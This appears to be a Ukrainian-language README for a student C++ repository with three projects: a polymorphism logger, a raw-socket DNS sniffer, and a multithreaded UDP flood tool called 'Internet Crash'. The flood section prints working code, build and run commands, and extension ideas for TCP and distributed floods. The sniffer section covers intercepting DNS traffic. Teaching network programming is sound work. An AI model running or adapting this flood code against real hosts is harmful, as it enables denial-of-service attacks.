# 📖 README_UK.md - Повна документація

## 🎓 University Learning - Навчальні проекти з C++

Репозиторій містить три науково-освітніх проекти на C++ для вивчення основних концепцій:
- **Об'єктно-орієнтовано програмування** (ООП)
- **Мережеві технології**
- **Багатопоточність**

⚠️ **Зауваження:** НЕ КОРИСТУЙТЕ ЦІМ ПРОГРАМНИМ ЗАБЕЗПЕЧЕННЯМ ЗІ ШКІДЛИВИМИ НАМІРАМИ!

---

## 📋 Зміст

- [Огляд проектів](#огляд-проектів)
- [Системні вимоги](#системні-вимоги)
- [Швидкий старт](#швидкий-старт)
- [Структура проекту](#структура-проекту)
- [Деталі кожного проекту](#деталі-кожного-проекту)
- [Навчальні концепції](#навчальні-концепції)
- [Запуск програм](#запуск-програм)
- [Розширення проектів](#розширення-проектів)

---

## 📚 Огляд проектів

### 1. Polymorphism Logger Demo 🎯

**Файл:** `polymorphism_logger_demo.cpp`

Демонстрація полімор физму в C++ через систему логування з різними типами логерів.

| Властивість | Значення |
|------------|----------|
| **Тема** | ООП - Поліморфізм |
| **Розмір** | ~841 байт |
| **Залежності** | STL (`iostream`, `vector`) |
| **Рівень** | Середній |
| **Час вивчення** | 30 хвилин |

**Ключові концепції:**
- ✅ Спадкування (Inheritance)
- ✅ Віртуальні методи (Virtual Methods)
- ✅ Поліморфізм (Polymorphism)
- ✅ Вектори вказівників (Vector of Pointers)
- ✅ Управління пам'яттю (Memory Management)

---

### 2. Internet Crash 🌐

**Файл:** `internet crash.cpp`

Демонстрація UDP Flood атаки для навчальних цілей на платформі Windows.

| Властивість | Значення |
|------------|----------|
| **Тема** | Мережеві технології - DDoS |
| **Розмір** | ~2180 байт |
| **Залежності** | WinSock2, Threading, Random |
| **Рівень** | Просунутий |
| **Час вивчення** | 1 година |
| **Платформа** | Windows тільки |

**Ключові концепції:**
- ✅ WinSock2 API
- ✅ UDP протокол
- ✅ Потоки (std::thread)
- ✅ Потокобезпечні змінні (std::atomic)
- ✅ Управління портами та адресами
- ✅ Буферизація даних

---

### 3. Network Sniffer 📡

**Файл:** `sniffer.cpp`

Аналізатор мережевих пакетів для перехвату та анализу DNS запитів на Windows.

| Властивість | Значення |
|------------|----------|
| **Тема** | Мережеві технології - Аналіз |
| **Розмір** | ~3967 байт |
| **Залежності** | WinSock2, RAW Sockets |
| **Рівень** | Просунутий |
| **Час вивчення** | 1.5 години |
| **Платформа** | Windows (потребує Admin) |

**Ключові концепції:**
- ✅ RAW сокети (SOCK_RAW)
- ✅ IP заголовки (IPv4 Header Parsing)
- ✅ UDP заголовки
- ✅ DNS протокол
- ✅ Бінарна обробка даних
- ✅ OOP дизайн (класи та методи)

---

## ⚙️ Системні вимоги

### Мінімальні вимоги

```
OS:           Windows 7+ / Linux / macOS
RAM:          512 МБ
Диск:         100 МБ
Компілятор:   GCC 7+, Clang 5+, MSVC 2019+
C++ Версія:   C++17 або вище
```

### Для специфічних проектів

| Проект | Вимоги |
|--------|--------|
| **Logger** | Будь-яка ОС |
| **Internet Crash** | Тільки Windows, Admin права |
| **Sniffer** | Тільки Windows, Admin права |

---

## ⚡ Швидкий старт

### За 5 хвилин

#### 1. Клонування
```bash
git clone https://github.com/mrdbv/university_learning.git
cd university_learning
```

#### 2. Компіляція Logger (всі ОС)
```bash
# Windows (MSVC)
cl /std:c++17 polymorphism_logger_demo.cpp

# Windows (GCC) / Linux / macOS
g++ -std=c++17 -o logger polymorphism_logger_demo.cpp
```

#### 3. Запуск
```bash
# Windows
logger.exe
# або
polymorphism_logger_demo.exe

# Linux / macOS
./logger
```

#### 4. Очікуваний вивід
```
Base log : Text message
File : Text message
Encrypted log :  Text message? ? ? ? ? ? ? ?
```

---

## 📁 Структура проекту

```
university_learning/
│
├── polymorphism_logger_demo.cpp     # ООП приклад
├── internet crash.cpp               # Мережа - DDoS
├── sniffer.cpp                      # Мережа - Аналізатор
│
├── README.md                        # Англійська документація
├── README_UK.md                     # Українська документація (цей файл)
├── SETUP_UK.md                      # Встановлення та налаштування
├── BUILD_UK.md                      # Компіляція для всіх платформ
├── API_UK.md                        # Детальна документація API
└── CONTRIBUTE_UK.md                 # Контрибют'ювання
```

---

## 🔍 Деталі кожного проекту

### Polymorphism Logger Demo

#### Мета
Вивчити поліморфізм та спадкування через практичний приклад системи логування.

#### Архітектура

```
Logger (базовий клас)
│
├── FileLogger
└── EncryptLogger
```

#### Вихідний код

```cpp
class Logger {
public:
    virtual void log(string message) { }
    virtual ~Logger() { }
};

class FileLogger : public Logger {
public:
    void log(string message) override { }
};

class EncryptLogger : public Logger {
public:
    void log(string message) override { }
};
```

#### Запуск

```bash
# Компіляція
g++ -std=c++17 -o polymorphism polymorphism_logger_demo.cpp

# Запуск
./polymorphism
```

#### Що вивчити

1. Що таке віртуальні функції?
2. Як працює override?
3. Які переваги поліморфізму?
4. Коли використовувати virtual?

---

### Internet Crash

#### Мета
Розуміння мережевих протоколів та багатопоточності через симуляцію UDP Flood атаки.

⚠️ **Передостереження:** Це навчальний проект. Використання проти сторонніх систем НЕЗАКОННО!

#### Архітектура

```
main()
├── WSAStartup()
├── Створення 16 потоків
│   └── flood() функція (UDP пакети)
└── Очікування Ctrl+C
```

#### Вихідний код (спрощено)

```cpp
const char* TARGET_IP = "192.168.1.1";
const int THREAD_COUNT = 16;

void flood() {
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in target = {};
    target.sin_family = AF_INET;
    inet_pton(AF_INET, TARGET_IP, &target.sin_addr);
    
    char data[1450];
    std::fill_n(data, 1450, 'X');
    
    while (!stop_flag) {
        target.sin_port = htons(random_port());
        sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&target, sizeof(target));
    }
    closesocket(sock);
}

int main() {
    // Запуск 16 потоків flood()
}
```

#### Запуск

```powershell
# Тільки Windows, потребує компіляції з WinSock2
cl /std:c++17 "internet crash.cpp" /link ws2_32.lib
"internet crash.exe"
```

#### Що вивчити

1. Як працює UDP протокол?
2. WinSock2 API
3. std::thread та потоки
4. std::atomic та потокобезпечність
5. UDP заголовки

---

### Network Sniffer

#### Мета
Розуміння аналізу мережевих пакетів та бінарної обробки даних.

#### Архітектура

```
NetworkMonitor
├── initialize()
│   ├── WSAStartup()
│   ├── socket(SOCK_RAW)
│   └── bind()
│
└── run()
    ├── recv() пакети
    ├── parse IP header
    ├── parse UDP header
    └── process DNS queries
```

#### Вихідний код (спрощено)

```cpp
struct IPHeader {
    uint8_t  v_hl;
    uint16_t total_len;
    uint8_t  protocol;    // 17 = UDP
    uint32_t src_addr;
    uint32_t dst_addr;
};

struct UDPHeader {
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t length;
};

void run() {
    vector<uint8_t> buffer(65535);
    
    while (_is_running) {
        int bytes = recv(_socket, buffer.data(), buffer.size(), 0);
        IPHeader* iph = reinterpret_cast<IPHeader*>(buffer.data());
        
        if (iph->protocol == 17) {  // UDP
            UDPHeader* udph = /* ... */;
            
            if (ntohs(udph->dst_port) == 53) {  // DNS
                process_dns_query(/* ... */);
            }
        }
    }
}
```

#### Запуск

```powershell
# Тільки Windows, потребує ADMIN прав!
cl /std:c++17 sniffer.cpp /link ws2_32.lib
sniffer.exe
```

#### Що вивчити

1. RAW сокети
2. IP та UDP заголовки
3. DNS протокол
4. Бінарна обробка даних
5. Класи в C++

---

## 🎓 Навчальні концепції

### ООП Концепції

| Концепція | Приклад | Файл |
|-----------|---------|------|
| Спадкування | `FileLogger : public Logger` | polymorphism_logger_demo.cpp |
| Віртуальні методи | `virtual void log()` | polymorphism_logger_demo.cpp |
| Поліморфізм | Вызов одного методу, різні реалізації | polymorphism_logger_demo.cpp |
| Перевизначення | `override` ключове слово | polymorphism_logger_demo.cpp |

### Мережеві концепції

| Концепція | Описание | Файл |
|-----------|----------|------|
| TCP/UDP | Протоколи транспортного шару | internet crash, sniffer |
| Сокети | Інтерфейс для мережі | internet crash, sniffer |
| Порти | Логічні канали | internet crash, sniffer |
| IP адреси | Адреси у мережі | internet crash, sniffer |

### Многопоточність

| Концепція | Описание | Файл |
|-----------|----------|------|
| std::thread | Створення потоків | internet crash |
| std::atomic | Потокобезпечні змінні | internet crash |
| Синхронізація | Контроль потоків | internet crash |
| join() | Очікування потоку | internet crash |

---

## 🚀 Запуск програм

### Logger (всі ОС)

```bash
# Компіляція
g++ -std=c++17 -O2 -Wall -o logger polymorphism_logger_demo.cpp

# Запуск
./logger

# Вихід
# Base log : Text message
# File : Text message
# Encrypted log :  Text message? ? ? ? ? ? ? ?
```

### Internet Crash (Windows тільки)

```powershell
# Компіляція
cl /std:c++17 "internet crash.cpp" /link ws2_32.lib

# Запуск (без admin прав це не буде працювати добре)
"internet crash.exe"

# Результат: відправлення UDP пакетів на TARGET_IP
# Натисніть Enter для зупинки
```

### Sniffer (Windows тільки, потребує Admin)

```powershell
# Компіляція
cl /std:c++17 sniffer.cpp /link ws2_32.lib

# Запуск (ТІЛЬКИ з правами адміністратора!)
# Правий клік → Run as Administrator

sniffer.exe

# Результат: перехоплення DNS запитів
# [12:34:56] DNS Request -> example.com
```

---

## 🔧 Розширення проектів

### Ідеї для Logger

1. **Рівні логування** (DEBUG, INFO, WARNING, ERROR)
   ```cpp
   class Logger {
       enum Level { DEBUG, INFO, WARNING, ERROR };
       virtual void log(Level level, string message) = 0;
   };
   ```

2. **Форматування**
   ```cpp
   // [2026-05-08 12:34:56] [ERROR] Помилка в коді
   ```

3. **Множні виходи**
   - CompositeLogger (кілька логерів одночасно)

---

### Ідеї для Internet Crash

1. **TCP натість** (замість UDP)
   ```cpp
   socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   ```

2. **Розподілені атаки** (кілька ціль)

3. **Сповільнення** (для тестування)

---

### Ідеї для Sniffer

1. **Фільтрування** (HTTP, FTP тощо)
   ```cpp
   if (ntohs(udph->dst_port) == 80) { }  // HTTP
   ```

2. **Сохранение у файл**
   ```cpp
   ofstream file("packets.log");
   file << "[DNS] " << domain << endl;
   ```

3. **Статистика**
   - Кількість пакетів
   - Найпопулярніші домени

---

## 📊 Статистика

| Метрика | Значення |
|---------|----------|
| **Усього файлів** | 3 C++ програм |
| **Загальний розмір** | ~7 KB |
| **Рядків коду** | ~400 |
| **Компонентів** | 3 основних класи |
| **Залежностей** | Тільки STL + WinSock2 |
| **Платформ** | Windows, Linux*, macOS* |

*Linux/macOS: тільки Logger, інші потребують адаптацій

---

## 🎓 Ресурси для навчання

### Посилання

1. **C++ Довідка** - https://cppreference.com
2. **WinSock2 Документація** - https://docs.microsoft.com/winsock
3. **UDP Протокол** - https://tools.ietf.org/html/rfc768
4. **DNS Протокол** - https://tools.ietf.org/html/rfc1035

### Книги

- "C++ Primer" by Stanley B. Lippman
- "Network Programming with Winsock2" by Quinn
- "Effective C++" by Scott Meyers

---

## ⚖️ Юридична інформація

⚠️ **Важливо:** Мережеві атаки (навіть для тестування) можуть бути незаконними.

- ✅ Використовуйте ТІЛЬКИ на власних системах
- ✅ Отримайте дозвіл власника перед тестуванням
- ✅ Знайте локальні закони про кіберзлочини
- ❌ НЕ використовуйте проти сторонніх систем

---

## 📞 Підтримка

- 🐛 **Помилка?** [Сповіщення](https://github.com/mrdbv/university_learning/issues)
- 💬 **Питання?** [Дискусії](https://github.com/mrdbv/university_learning/discussions)
- 🤝 **Контрибют?** Дивіться [CONTRIBUTE_UK.md](CONTRIBUTE_UK.md)

---

## 📚 Документація

- 📖 [README_UK.md](README_UK.md) - Цей файл
- ⚙️ [SETUP_UK.md](SETUP_UK.md) - Встановлення
- 🔨 [BUILD_UK.md](BUILD_UK.md) - Компіляція
- 📚 [API_UK.md](API_UK.md) - API документація
- 🤝 [CONTRIBUTE_UK.md](CONTRIBUTE_UK.md) - Контрибют'ювання

---

**Версія:** 2.0  
**Мова:** Українська  
**Оновлено:** 2026-05-08  
**Автор:** mrdbv

**Licenced:** Educational Use Only  
**Made with ❤️ for learning C++**

*Готові вчитися? Почніть з [SETUP_UK.md](SETUP_UK.md)! 🚀*
